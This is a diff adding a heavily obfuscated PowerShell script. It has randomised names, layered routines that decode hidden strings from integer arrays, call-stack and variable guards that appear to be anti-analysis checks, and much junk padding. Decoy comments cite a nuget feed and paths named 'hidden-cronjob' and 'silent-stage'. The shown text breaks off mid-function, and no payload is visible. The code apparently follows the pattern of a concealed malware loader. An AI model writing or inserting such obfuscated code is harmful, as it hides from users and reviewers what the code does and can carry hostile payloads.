@@ -1,0 +1,1268 @@
+
+$script:OixqDAqKgH = 315903
+function gqB94ZJ4QesZdJHaXi {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return 'dphwjxm' }
+    return 'dphwjxm'
+}
+function lHOb6JgyzxOy0n {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return 'dphwjxm' }
+    $c = (($x * 31) + $y) -band 65535
+    return (& gqB94ZJ4QesZdJHaXi $x $y $c)
+}
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 1) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 3067); & IUk4aSvMUzxiduL4YO 557 799 319 | Out-Null } catch { } }
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 2) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 3621); & tTI8G5WOVh18qx4 192 609 266 | Out-Null } catch { } }
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 2) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 3969); & orIzKYA1e09EByw7D4 401 595 625 | Out-Null } catch { } }
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 2) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 207); & orIzKYA1e09EByw7D4 3311 3250 | Out-Null } catch { } }
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 1) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 3540); & tTI8G5WOVh18qx4 4360 4832 | Out-Null } catch { } }
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 1) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 2359); & yvbqkPkTKeMnHnh 6315 2915 | Out-Null } catch { } }
+if ((-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) -and (@((Get-PSCallStack -ErrorAction SilentlyContinue)).Count) -le 1) { try { $script:OixqDAqKgH = (((Get-Variable -Name OixqDAqKgH -Scope Script -ErrorAction SilentlyContinue).Value) -bxor 463); & lHOb6JgyzxOy0n 886 618 | Out-Null } catch { } }
+$script:e5JIFRye9ZmUgRVb = ([int](((((((((0x273AF54DL) + 702L + 734L) - 734L - 702L)) + 875L + 1353L) - 1353L - 875L)) + 3301L) - 3301L))
+$script:_uSllEGA = 0
+for ($_t0Rf9VUQqHg = 0; $_t0Rf9VUQqHg -lt 0; $_t0Rf9VUQqHg++) { $_byxKl_tgalM = 7659 }
+try {
+    0 | Out-Null
+} finally {
+    $null = [Math]::Sign(29)
+}
+$_jgAwlHn = @{ 'Fz4N' = 264; 'KXBQ' = 724; 'v8xY' = 275 }
+$_jgAwlHn['Awc3H'] = $_jgAwlHn['Fz4N'] + $_jgAwlHn['KXBQ']
+$zGv2XcWPyegKAPqXe = ($_jgAwlHn.Values | Measure-Object -Sum).Sum
+[void]$zGv2XcWPyegKAPqXe
+$script:q4VwXLG = 0
+function IUk4aSvMUzxiduL4YO {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((((($slot * 13) + $salt) -band 8191) -ne $guard)) { return '' }
+    $tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $tk) { [long]$tk = 0 }
+    if ((($script:e5JIFRye9ZmUgRVb -band ([int]((((((2929L) - 3039L) + 3039L) + 750L + 827L) - 827L - 750L)))) -eq ([int]((((32275L) + 3509L + 1984L) - 1984L - 3509L))))) {
+    $_bb6gLDDRKe = 636
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int]((((0x273AF54DL) + 1203L + 1109L) - 1109L - 1203L))))) { $dc6Zo = $_bb6gLDDRKe * 2 }
+    else { $dc6Zo = $_bb6gLDDRKe - 4925 }
+} else {
+    $_bb6gLDDRKe = 4925
+}
+[void]$_bb6gLDDRKe
+$dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $dk) { [long]$dk = 0 }
+    $d = @(-57025, -56990, -56973, -57046, -56990, -56989, -56971, -56978)
+    $_LpPjbER8m3_ = 0; for ($v40d75929d = 0; $v40d75929d -lt 3; $v40d75929d++) { $_LpPjbER8m3_ = $_LpPjbER8m3_ + $v40d75929d }; [void]$_LpPjbER8m3_
+$r = ''
+    $Oy9rJxbM = 692
+switch ($Oy9rJxbM) {
+    738 { $_a6IaEjKeb = 'LwOft' }
+    772 { $_a6IaEjKeb = 'biQe5' }
+    default { $_a6IaEjKeb = $Oy9rJxbM * 2 }
+}
+[void]$_a6IaEjKeb
+for ($ykjWrqnj = $d.Length - 1; $ykjWrqnj -ge 0; $ykjWrqnj--) {
+        [long]$v = [long]$d[$ykjWrqnj]
+        for ($UPPhYfny7Jv3Z = 0; $UPPhYfny7Jv3Z -ge 0; $UPPhYfny7Jv3Z--) {
+            for ($nR8n5Bgyy = 0; $nR8n5Bgyy -ge 0; $nR8n5Bgyy--) {
+                for ($UG4EUhf6Ed30T = 2; $UG4EUhf6Ed30T -ge 0; $UG4EUhf6Ed30T--) {
+                        [long]$v = [long](-bnot $v)
+                        [long]$v = [long]$v - ([long](114))
+                        [long]$v = [long]$v -bxor ([long](52955))
+                }
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r = [char][int][long]$v + $r }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r = [System.Char]::ConvertFromUtf32([int][long]$v) + $r }
+    }
+    return $r
+}
+$hVwcwRWrgrHGr6jHw = 853
+switch ($hVwcwRWrgrHGr6jHw) {
+    894 { $vkFiEk3nP70EED = 'Y2DyE' }
+    913 { $vkFiEk3nP70EED = 'g7TP8' }
+    default { $vkFiEk3nP70EED = $hVwcwRWrgrHGr6jHw * 2 }
+}
+[void]$vkFiEk3nP70EED
+try{[void](355 -band 220); }finally{[void]([Math]::Min(860, 409))}
+function hRe2Fp35qzvCZXk {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    @('RFB', 'MpzP', 'MDl8q') | ForEach-Object { $_.ToUpper() } | Out-Null
+if ((((($a * 13) + $b) -band 8191) -ne $c)) { return '' }
+    return (& IUk4aSvMUzxiduL4YO $a $b $c)
+}
+try { $_ojjWgzEp649 = [Math]::Sqrt(5327) } finally { [void]$_ojjWgzEp649 }
+try {
+   try{
+     try { $null = [Convert]::ToString(11, 16) } finally { $null = (922 + 594) }
+   } finally{
+     [void](804 -band 218)
+   }
+} finally {
+   $null = [Convert]::ToString(756, 16)
+}
+function tTI8G5WOVh18qx4 {
+    param([int]$x, [int]$y)
+    if ((([Math]::Sign(-15) -eq 3)) -and ([bool]((($script:e5JIFRye9ZmUgRVb -bxor ([int](((0x1D828F34L) - 20518L) + 20518L))) -eq ([int]((((((985180462L) + 507L + 195L) - 195L - 507L)) + (46150L - 46150L)))))))) { $null = [string]::Join('-', @('Register-ObjectEvent', 'eLRISDh1TBd')) }
+if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $WAC4_s2mP9hi = @(-26, 58, 657, 951, -267, 873, -895)
+$_pgYndnI = 0
+foreach ($lXjEpYcKIrZBufe in $WAC4_s2mP9hi) { $_pgYndnI = $_pgYndnI + $lXjEpYcKIrZBufe }
+[void]$_pgYndnI
+try { [void](505 -band 79) } finally { [void](50 -band 169) }
+$a = $x -bxor 5115
+    try { [void]('Zx_b'.Length) } finally {0 | Out-Null; 0 | Out-Null}
+$b = $y -bxor 4545
+    $RMK5Xr9XD9S0Pymw = 'C8SWybNv'.ToUpper().Substring(0, 3)
+[void]$RMK5Xr9XD9S0Pymw
+try {[void]([Math]::Max(340, 831))} finally { 1..2 | Out-Null }
+$c = ((($a * 13) + $b) -band 8191)
+    # nuget feed mirror .\pkgs\nested-realm\silent-stage\micro_field_5564.psm1
+# requires -Modules @PowerShellGet # ref .\bulk-handler\upper_jail_18165.psd1
+#  . C:\Temp\PowerShell\7-preview\Modules\hidden-cronjob\quiet_bridge_78586.psd1
+$f9IHPLVIJaPHg0nT3W = [Math]::Abs([Math]::Pow([Math]::Floor([Math]::Max(750, 48) + 0.5014), 2))
+[void]$f9IHPLVIJaPHg0nT3W
+try {
+    try {
+      [void]('X3HibA'.Length)
+    } finally {
+      try {  [void](933 -band 240) } finally { $null = [Math]::Sign(-3) }
+    }
+ } finally {
+    $null = [Math]::Sign(4)
+ }
+return (& hRe2Fp35qzvCZXk $a $b $c)
+}
+
+1..5 | ForEach-Object { $_ * 2 } | Out-Null
+function Q4Uix2pyvks0 {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $cYPHHnbd = 0; for ($blhHzB6SeD5m3 = 0; $blhHzB6SeD5m3 -lt 2; $blhHzB6SeD5m3++) { $cYPHHnbd = $cYPHHnbd + $blhHzB6SeD5m3 }; [void]$cYPHHnbd
+if ((((($slot * 13) + $salt) -band 8191) -ne $guard)) { return '' }
+    $XwjKsNzqviKSm8Tk = '_QDTaB6z'.ToLower().Replace('B', 'p').ToUpper()
+[void]$XwjKsNzqviKSm8Tk
+$tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $tk) { [long]$tk = 0 }
+    $yTvp_wYc0HfEo = @(112, -737, 258, 752, 502)
+$mUEHmomymQr = 0
+foreach ($qPcgFIuNn in $yTvp_wYc0HfEo) { $mUEHmomymQr = $mUEHmomymQr + $qPcgFIuNn }
+[void]$mUEHmomymQr
+$dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $dk) { [long]$dk = 0 }
+    $lbrt57xNaZAKRX = @(158, -517, 350, -795, -983, 562, -452, 180)
+$bNjXN3Ws8g5I = 0
+foreach ($rmXwJIIFA in $lbrt57xNaZAKRX) { $bNjXN3Ws8g5I = $bNjXN3Ws8g5I + $rmXwJIIFA }
+[void]$bNjXN3Ws8g5I
+$d = @(62359)
+    $r = ''
+    $PS_N9oh0YMzMzJ2 = @(825, -152, -284, 930, -248, -623, -812)
+$ZaUFJRSterUmXY_ = 0
+foreach ($PJ0Zv283 in $PS_N9oh0YMzMzJ2) { $ZaUFJRSterUmXY_ = $ZaUFJRSterUmXY_ + $PJ0Zv283 }
+[void]$ZaUFJRSterUmXY_
+for ($LyAyodlktvLH = 0; $LyAyodlktvLH -lt $d.Length; $LyAyodlktvLH++) {
+        [long]$v = [long]$d[$LyAyodlktvLH]
+        for ($bwVoQVEy7 = 2; $bwVoQVEy7 -ge 0; $bwVoQVEy7--) {
+            for ($EPun5YXKfXpvp = 0; $EPun5YXKfXpvp -ge 0; $EPun5YXKfXpvp--) {
+                    [long]$v = [long]$v -bxor ([long](62635))
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r += [char][int][long]$v }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r += [System.Char]::ConvertFromUtf32([int][long]$v) }
+    }
+    return $r
+}
+function SmUYTnOP5WTXNNJN2Ww {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    try { $_H6My5nA = [Math]::Sqrt(5134) } finally { [void]$_H6My5nA }
+if ((((($a * 13) + $b) -band 8191) -ne $c)) { return '' }
+    try { [void]([Math]::Max(238, 635)) } finally { [void]([Math]::Abs(-231)) }
+@(209, 595, 589, 821) | Where-Object { $_ -gt 4 } | ForEach-Object { [Math]::Pow($_, 2) } | Out-Null
+return (& Q4Uix2pyvks0 $a $b $c)
+}
+function orIzKYA1e09EByw7D4 {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $a = $x -bxor 4017
+    $eLYowy = 193
+switch ($eLYowy) {
+    236 { $_n89vG9lHPhD = 'QCcWD' }
+    280 { $_n89vG9lHPhD = 'uwHYY' }
+    default { $_n89vG9lHPhD = $eLYowy * 2 }
+}
+[void]$_n89vG9lHPhD
+$b = $y -bxor 3822
+    try{$null = (@(478, 308, 786)).Count; }finally{[void]('QQlrAK7X'.Length)}
+$_mc_ilj_ = @(981, -891, 156, 837, -525, -77, 412)
+$Bi31b8a6 = 0
+foreach ($TD9ebXQlZAwz in $_mc_ilj_) { $Bi31b8a6 = $Bi31b8a6 + $TD9ebXQlZAwz }
+[void]$Bi31b8a6
+$c = ((($a * 13) + $b) -band 8191)
+    $aKAj16oGh0x = 128 * 164 + 39
+$UoruBiZyFCIsZ = [Math]::Abs($aKAj16oGh0x - 265)
+$F4YG5lXnEO = [Math]::Max($aKAj16oGh0x, $UoruBiZyFCIsZ) - [Math]::Min($aKAj16oGh0x, $UoruBiZyFCIsZ)
+[void]$F4YG5lXnEO
+return (& SmUYTnOP5WTXNNJN2Ww $a $b $c)
+}
+
+function TCy_YvXaG9dLHx1I4 {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((((($slot * 31) + $salt) -band 65535) -ne $guard)) { return '' }
+    if ((($script:e5JIFRye9ZmUgRVb -band ([int](((((((814L) + 2942L + 2005L) - 2005L - 2942L)) + 3065L + 196L) - 196L - 3065L)))) -eq ([int]((((0x10CL) + 1496L + 244L) - 244L - 1496L))))) { $ZIwX0hZvwJIcMoD3 = -7660 }
+$tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $tk) { [long]$tk = 0 }
+    $dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    for ($_t415rL657EBt = 0; $_t415rL657EBt -lt 0; $_t415rL657EBt++) { $JUEqf8MJeTf6ox = 3638 }
+if ($null -eq $dk) { [long]$dk = 0 }
+    for ($tAI5ut = 0; $tAI5ut -lt 0; $tAI5ut++) { $I4SpHsZZb = 8514 }
+$d = @(5585, 5588, 4133, 4166, 5091, 4182, 6888, 6084, 4592, 4175, 4181, 4166, 6393, 4181)
+    $_D9b2Xo8 = @{ 'IM5g' = 324; 'dhDO' = 130; 'fscO' = 150 }
+$_D9b2Xo8['qqyVd'] = $_D9b2Xo8['IM5g'] + $_D9b2Xo8['dhDO']
+$_JU0KdXz_MF = ($_D9b2Xo8.Values | Measure-Object -Sum).Sum
+[void]$_JU0KdXz_MF
+$r = ''
+    $_hgFvuSaht = [Math]::Max([Math]::Sqrt([Math]::Abs(630)), 18)
+[void]$_hgFvuSaht
+for ($wSb237QBqjjk = $d.Length - 1; $wSb237QBqjjk -ge 0; $wSb237QBqjjk--) {
+        [long]$v = [long]$d[$wSb237QBqjjk]
+        for ($GcnS_0WSejebdGT = 2; $GcnS_0WSejebdGT -ge 0; $GcnS_0WSejebdGT--) {
+            for ($llxkLluWuz = 1; $llxkLluWuz -ge 0; $llxkLluWuz--) {
+                for ($W_bmK0sZJkZza = 1; $W_bmK0sZJkZza -ge 0; $W_bmK0sZJkZza--) {
+                        [long]$v = [long]$v -bxor ([long](8391))
+                        [long]$v = [long]$v - ([long](123))
+                }
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r = [char][int][long]$v + $r }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r = [System.Char]::ConvertFromUtf32([int][long]$v) + $r }
+    }
+    if ([string]::IsNullOrWhiteSpace('   ')) { $PtMOwwvpCkbjNbTF = -1910 }
+return $r
+}
+$_dDnZ7_H = @(-871, 945, -299, 22, 661)
+$x28fb5f9f = 0
+foreach ($d5RgzDUMJxO in $_dDnZ7_H) { $x28fb5f9f = $x28fb5f9f + $d5RgzDUMJxO }
+[void]$x28fb5f9f
+try {
+     try {
+       1..3 | Out-Null
+     } finally{
+       $null = (@(689, 969, 1658)).Count
+     }
+ } finally {
+     2 | Out-Null
+ }
+function m692MNrUmS_ {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    foreach ($AES4OJt8OajYTC4G in @()) { $emdmWM0tryuDabv = 3918 }
+if ((((($a * 31) + $b) -band 65535) -ne $c)) { return '' }
+    if ((($script:e5JIFRye9ZmUgRVb -band ([int]((((0x50C6L) + 2912L + 2L) - 2L - 2912L)))) -eq ([int]((((13892L) + 918L + 636L) - 636L - 918L))))) { $tKG8jBUi2GMzT = [Math]::Pow(43, 4) }
+return (& TCy_YvXaG9dLHx1I4 $a $b $c)
+}
+try {
+     [void](665 -bxor 204)
+} finally {
+     try {
+        1..2 | Out-Null
+     } finally {
+        $null = [Convert]::ToString(834, 16)
+     }
+}
+$TvP0PG5qpkj = @{ 'bmKI' = 169; 'XAro' = 743; 'uQsl' = 131 }
+$TvP0PG5qpkj['gO57Q'] = $TvP0PG5qpkj['bmKI'] + $TvP0PG5qpkj['XAro']
+$w9cNLUM1F = ($TvP0PG5qpkj.Values | Measure-Object -Sum).Sum
+[void]$w9cNLUM1F
+function yvbqkPkTKeMnHnh {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $a = $x -bxor 6559
+    $b = $y -bxor 2443
+    $c = ((($a * 31) + $b) -band 65535)
+    return (& m692MNrUmS_ $a $b $c)
+}
+
+$_LQFecGRG = @{ 'zBAX' = 342; 'XCWs' = 913; 'jBCA' = 716 }
+$_LQFecGRG['HaRuS'] = $_LQFecGRG['zBAX'] + $_LQFecGRG['XCWs']
+$v678086e11 = ($_LQFecGRG.Values | Measure-Object -Sum).Sum
+[void]$v678086e11
+try{
+     $null = (@(670, 542, 1212)).Count
+} finally{
+     try{
+       $null = [Math]::Sign(39)
+     } finally{
+       1..3 | Out-Null
+      }
+}
+$SJ9S1gJKkdjRmqmK5 = [Math]::Sqrt([Math]::Abs([Math]::Floor(525 + 0.7960)))
+[void]$SJ9S1gJKkdjRmqmK5
+function Kcx9keqXJ1ShBw_HW2 {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((((($slot * 37) + $salt) -band 32767) -ne $guard)) { return '' }
+    $sGKGoTXuATcdY = 416 * 205 + 37
+$_peLE4js = [Math]::Abs($sGKGoTXuATcdY - 7493)
+$CwLi_ = [Math]::Max($sGKGoTXuATcdY, $_peLE4js) - [Math]::Min($sGKGoTXuATcdY, $_peLE4js)
+[void]$CwLi_
+$tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    $vb15cc6f83 = [Math]::Sqrt([Math]::Abs([Math]::Max([Math]::Sqrt([Math]::Abs([Math]::Floor(61 + 0.0172))), 70)))
+[void]$vb15cc6f83
+if ($null -eq $tk) { [long]$tk = 0 }
+    $dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    $hu1nvvF7Lw4SC = 685
+switch ($hu1nvvF7Lw4SC) {
+    715 { $LqGItytO = 'u12SI' }
+    774 { $LqGItytO = 'Uixec' }
+    default { $LqGItytO = $hu1nvvF7Lw4SC * 2 }
+}
+[void]$LqGItytO
+if ($null -eq $dk) { [long]$dk = 0 }
+    $d = @(6197, 6157, 6181, 6240, 6252, 6278, 6286)
+    $xbe40a06 = [Math]::Abs([Math]::Pow([Math]::Max([Math]::Floor(90 + 0.8204), 46), 2))
+[void]$xbe40a06
+$r = ''
+    for ($LO_IqB0M = $d.Length - 1; $LO_IqB0M -ge 0; $LO_IqB0M--) {
+        [long]$v = [long]$d[$LO_IqB0M]
+        for ($i6v3EHkJR = 2; $i6v3EHkJR -ge 0; $i6v3EHkJR--) {
+                [long]$v = [long](-bnot $v)
+                [long]$v = [long](-bnot $v)
+        }
+        for ($QzjMpogXk9ba = 2; $QzjMpogXk9ba -ge 0; $QzjMpogXk9ba--) {
+                [long]$v = [long]$v - ([long]([int]((((((220 + (3 * $LO_IqB0M) + (-7 * $QzjMpogXk9ba))) % 256) + 256) % 256))))
+                [long]$v = [long]$v - ([long]([int]((((((80 + (2 * $LO_IqB0M) + (-6 * $QzjMpogXk9ba))) % 256) + 256) % 256))))
+        }
+        for ($SsTGtm1RjfFczvt1 = 1; $SsTGtm1RjfFczvt1 -ge 0; $SsTGtm1RjfFczvt1--) {
+                [long]$v = [long]$v -bxor ([long](24338))
+                [long]$v = [long]$v + ([long](144))
+                [long]$v = [long]$v -bxor ([long](44405))
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r = [char][int][long]$v + $r }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r = [System.Char]::ConvertFromUtf32([int][long]$v) + $r }
+    }
+    $A1wYQq8p = 'kH6tSfdvr'.Substring(0, 1).PadRight(2, '4').ToLower().Substring(0, 1)
+[void]$A1wYQq8p
+return $r
+}
+try { [void](718 -bxor 558) } finally { [void]([Math]::Max(830, 936)); $null = [Math]::Sign(-19) }
+function w6NFyj2wVEx_b9w27i {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $WyL7yjD = @(-745, -752, 51, 795, -55, -317, 647)
+$leoXKU3ptS1z8 = 0
+foreach ($NMHt8mthgKd2PLU in $WyL7yjD) { $leoXKU3ptS1z8 = $leoXKU3ptS1z8 + $NMHt8mthgKd2PLU }
+[void]$leoXKU3ptS1z8
+try{
+     [void]([Math]::Min(315, 704))
+ } finally{
+     try {
+        try {[void]([Math]::Min(104, 421)) } finally {0 | Out-Null}
+     } finally{
+        try {[void]([Math]::Abs(-68))} finally {[void]([Math]::Max(394, 561))}
+     }
+ }
+$BXcZU7DXI9jXBKC3 = 780
+switch ($BXcZU7DXI9jXBKC3) {
+    825 { $utRIG2oa9pqHh = 'FEYgI' }
+    848 { $utRIG2oa9pqHh = 'G1_Tv' }
+    default { $utRIG2oa9pqHh = $BXcZU7DXI9jXBKC3 * 2 }
+}
+[void]$utRIG2oa9pqHh
+if ((((($a * 37) + $b) -band 32767) -ne $c)) { return '' }
+    $DPknZuOInZ = 'uGM0Fdyy92'.Substring(0, 2).Replace('0', 'r')
+[void]$DPknZuOInZ
+return (& Kcx9keqXJ1ShBw_HW2 $a $b $c)
+}
+$Oq0wD = 499
+switch ($Oq0wD) {
+    527 { $xe40f3c06 = 'HSEc6' }
+    597 { $xe40f3c06 = 'Z2NTN' }
+    default { $xe40f3c06 = $Oq0wD * 2 }
+}
+[void]$xe40f3c06
+try {
+    [void](37 -bxor 703)
+ } finally {
+    [void]([Math]::Max(911, 468))
+ }
+1..6 | ForEach-Object { $_ * 2 } | Out-Null
+function D8Mfx0TjSYlGdN {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    	if ((-not [bool]1)) { $_dmOm1mnMIcF = 'owDIbYd98u'.GetHashCode() }
+try { $null = (848 + 410) } finally {0 | Out-Null}
+foreach ($TpEwTB in @()) { $_RUch_y = 6635 }
+$a = $x -bxor 4031
+    $E1YDXsB5f02a8 = [Math]::Sqrt([Math]::Abs([Math]::Max([Math]::Abs(649), 12)))
+[void]$E1YDXsB5f02a8
+try { $null = (452 + 591) } finally {$null = (@(28, 607, 635)).Count;[void](0)}
+$b = $y -bxor 5539
+    	$D95ZnjHOFQe9pZ = 'vM8Y1BFFN'.PadRight(11, '7').ToLower().ToUpper().Substring(0, 1)
+[void]$D95ZnjHOFQe9pZ
+try {[void]('sXmqYaa'.Length)} finally {[void](0)}
+$v814d6f2 = 322 * 217 + 60
+$y_GmNUzMBufJUH = [Math]::Abs($v814d6f2 - 3643)
+$_P_vhr8F3u = [Math]::Max($v814d6f2, $y_GmNUzMBufJUH) - [Math]::Min($v814d6f2, $y_GmNUzMBufJUH)
+[void]$_P_vhr8F3u
+$c = ((($a * 37) + $b) -band 32767)
+    try {
+    $d48imH = 273 + 46
+    $IK8TrB5uzX = [Math]::Pow($d48imH, 2)
+} catch {
+    $IK8TrB5uzX = [Math]::Abs(273 - 46)
+}
+[void]$IK8TrB5uzX
+return (& w6NFyj2wVEx_b9w27i $a $b $c)
+}
+
+$U52ytHJl = [Math]::Max([Math]::Max([Math]::Pow(32, 2), 53), 1)
+[void]$U52ytHJl
+try{ [void](0); }finally{ $null = [Convert]::ToString(204, 16) }
+function SWhfkCsFF0dMG29p {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((((($slot * 13) + $salt) -band 8191) -ne $guard)) { return '' }
+    $tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $tk) { [long]$tk = 0 }
+    if ((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))) { $d71PBKyj = @(-955, -187, -879); $d71PBKyj = ($d71PBKyj | Measure-Object -Sum).Sum }
+$dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $dk) { [long]$dk = 0 }
+    $h6WuyaM5LCvg = @(77, 560, 460, -221, -685, 255, 993, -342)
+$_DMH74Xa = 0
+foreach ($v7b90877f0c5 in $h6WuyaM5LCvg) { $_DMH74Xa = $_DMH74Xa + $v7b90877f0c5 }
+[void]$_DMH74Xa
+$d = @(2775, 5188, 2450)
+    $lKJpZatQ2hfyLQ = 220 * 323 + 23
+$HdsIIfOX5AaRVqPUs6 = [Math]::Abs($lKJpZatQ2hfyLQ - 8231)
+$_qhhyWILX8BR = [Math]::Max($lKJpZatQ2hfyLQ, $HdsIIfOX5AaRVqPUs6) - [Math]::Min($lKJpZatQ2hfyLQ, $HdsIIfOX5AaRVqPUs6)
+[void]$_qhhyWILX8BR
+$r = ''
+    $_ROWIJ0VShO5T70g = 'q3w7zfnD5'.PadRight(11, '1').PadRight(12, '4')
+[void]$_ROWIJ0VShO5T70g
+for ($EWbAWoBOCv = 0; $EWbAWoBOCv -lt $d.Length; $EWbAWoBOCv++) {
+        [long]$v = [long]$d[$EWbAWoBOCv]
+        for ($IXhaTDVFFLF6zmt = 1; $IXhaTDVFFLF6zmt -ge 0; $IXhaTDVFFLF6zmt--) {
+            for ($nz6gAwDIyHAUo = 1; $nz6gAwDIyHAUo -ge 0; $nz6gAwDIyHAUo--) {
+                    [long]$v = [long]$v - ([long]([int]((((((166 + (2 * $EWbAWoBOCv) + (-7 * $IXhaTDVFFLF6zmt) + (-6 * $nz6gAwDIyHAUo))) % 256) + 256) % 256))))
+                    [long]$v = [long](-bnot ([long]$v -bxor ([long]([int]((((((31993 + (2 * $EWbAWoBOCv) + (7 * $nz6gAwDIyHAUo))) % 65536) + 65536) % 65536))))))
+                    [long]$v = [long]$v - ([long](182))
+            }
+        }
+        for ($GYWuJpyl6GlQ7afi = 2; $GYWuJpyl6GlQ7afi -ge 0; $GYWuJpyl6GlQ7afi--) {
+            for ($VBDbt15w = 1; $VBDbt15w -ge 0; $VBDbt15w--) {
+                    [long]$v = [long]$v -bxor ([long]([int]((((((2114 + (-3 * $EWbAWoBOCv) + (3 * $VBDbt15w))) % 65536) + 65536) % 65536))))
+                    [long]$v = [long]$v -bxor ([long]([int]((((((38796 + $EWbAWoBOCv + (2 * $VBDbt15w))) % 65536) + 65536) % 65536))))
+                    [long]$v = [long]$v + ([long](30))
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r += [char][int][long]$v }
